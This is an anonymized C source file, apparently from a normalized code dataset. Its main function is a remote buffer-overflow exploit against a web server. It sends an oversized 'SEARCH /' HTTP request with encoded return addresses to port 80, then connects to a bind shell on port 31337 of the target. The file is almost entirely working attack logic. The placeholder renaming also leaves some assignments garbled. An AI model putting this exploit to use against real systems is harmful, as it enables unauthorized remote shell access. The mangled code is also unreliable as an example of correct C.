
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {void* sin_port; void* sin_family; int sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int sock2 ;
typedef int sock1 ;


 void* VAR_0 ;
 int VAR_1 ;
 size_t VAR_2 ;
 int VAR_3 ;
 size_t VAR_4 ;
 int VAR_5 ;
 size_t VAR_6 ;
 unsigned long VAR_7 ;
 int VAR_8 ;
 int FUNC_0 (int ,int *,int ) ;
 char* VAR_9 ;
 int FUNC_1 (char*,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ,char*) ;
 struct hostent* FUNC_6 (char*) ;
 void* FUNC_7 (int) ;
 char* VAR_10 ;
 int FUNC_8 (char*,char*,int) ;
 int FUNC_9 (char*,int,int) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,...) ;
 int FUNC_12 (int,char*,int,int ) ;
 int FUNC_13 (int) ;
 char* VAR_11 ;
 int FUNC_14 (int) ;
 int FUNC_15 (void*,int ,int ) ;
 int FUNC_16 (char*,char*,char*,int) ;
 int VAR_12 ;
 int FUNC_17 (char*,char*) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (char*) ;

int FUNC_20(int VAR_13, char **VAR_14)
{
struct hostent *VAR_15;
struct sockaddr_in VAR_16;
struct sockaddr_in VAR_17;
unsigned short VAR_18;
unsigned long VAR_19=VAR_7;
char VAR_20[100000];
int VAR_21, VAR_22, VAR_23,VAR_24,VAR_25;

   if (VAR_13 != 2) FUNC_19(VAR_14[0]);

   FUNC_11("Resolving %s .. ", VAR_14[1]);
   if ((VAR_15 = FUNC_6(VAR_14[1])) == ((void*)0))
   {
      FUNC_5(VAR_12, "Unknown host\n");
      FUNC_4(-1);
   }

   FUNC_11("Resolved\n");

   VAR_18 = FUNC_7(31337);
   VAR_18 ^= 0x9999;

   *(unsigned short *)&VAR_11[VAR_6] = VAR_18;
   *(unsigned long *)&VAR_11[VAR_4] = VAR_3 ^ 0x99999999;
   *(unsigned long *)&VAR_11[VAR_2] = VAR_1 ^ 0x99999999;

   FUNC_0(VAR_15->h_addr, &VAR_16, VAR_15->h_length);
   VAR_16 = VAR_0;
   VAR_16 = FUNC_7(80);

   FUNC_11("[+] Attacking to %s via port: 80\n", VAR_14[1]);

   if ((VAR_21 = FUNC_15(VAR_0, VAR_8, 0)) == -1) {
      FUNC_10("Failed to create socket");
      FUNC_4(-1);
   }

   if (FUNC_3(VAR_21, (struct sockaddr *)&VAR_16, sizeof(VAR_16)) == -1)
   {
      FUNC_10("Failed to connect");
      FUNC_4(-1);
   }

   FUNC_1(VAR_20,100000);
   FUNC_17(VAR_20,"SEARCH /");

   VAR_24 = FUNC_18(VAR_20);
   VAR_20[VAR_24] = VAR_5;

   for (VAR_25=VAR_24+1; VAR_25 < VAR_24+2150; VAR_25+=2)
       *(unsigned short *)&VAR_20[VAR_25] = (unsigned short)VAR_19;

   for (; VAR_25 < VAR_24+65535-FUNC_18(VAR_10); VAR_25++)
       VAR_20[VAR_25] = VAR_5;

   FUNC_8(&VAR_20[VAR_25], VAR_10, FUNC_18(VAR_10));
   FUNC_17(VAR_20+FUNC_18(VAR_20), " HTTP/1.1\r\n");
   FUNC_16(VAR_20+FUNC_18(VAR_20), "Host: %s\r\nContent-Type: text/xml\r\n"
                                  "Content-Length: %d\r\n\r\n", VAR_14[1], FUNC_18(VAR_9)
+ FUNC_18(VAR_11));
   FUNC_17(VAR_20+FUNC_18(VAR_20), VAR_9);
   FUNC_9(VAR_20+FUNC_18(VAR_20), 0x01, 1);
   FUNC_9(VAR_20+FUNC_18(VAR_20), VAR_5, 3);
   FUNC_17(VAR_20+FUNC_18(VAR_20), VAR_11);

   if (FUNC_12(VAR_21, VAR_20, FUNC_18(VAR_20), 0) != FUNC_18(VAR_20))
   {
      FUNC_10("Failed to send");
      FUNC_4(-1);
   }

   FUNC_11("[+] Overflow sent, waiting for 5 seconds\n");
   FUNC_14(5);

   FUNC_0(VAR_15->h_addr, &VAR_17, VAR_15->h_length);
   VAR_17 = VAR_0;
   VAR_17 = FUNC_7(31337);

   FUNC_11("[+] Connecting to %s: 31337\n", VAR_14[1]);

   if ((VAR_22 = FUNC_15(VAR_0, VAR_8, 0)) == -1) {
      FUNC_10("Failed to create socket");
      FUNC_4(-1);
   }

   if (FUNC_3(VAR_22, (struct sockaddr *)&VAR_17, sizeof(VAR_17)) == -1)
   {
      FUNC_11("[+] Unable to connect.\n"
             "[+] Exploitation failed, maybe blocked by firewall.\n");
      FUNC_2(VAR_21);
      FUNC_2(VAR_22);
      FUNC_4(-1);
   }

   FUNC_2(VAR_21);
   FUNC_11("[+] Successfull, attempting to join shell ...\n\n");
   FUNC_13(VAR_22);
   return 0;
}
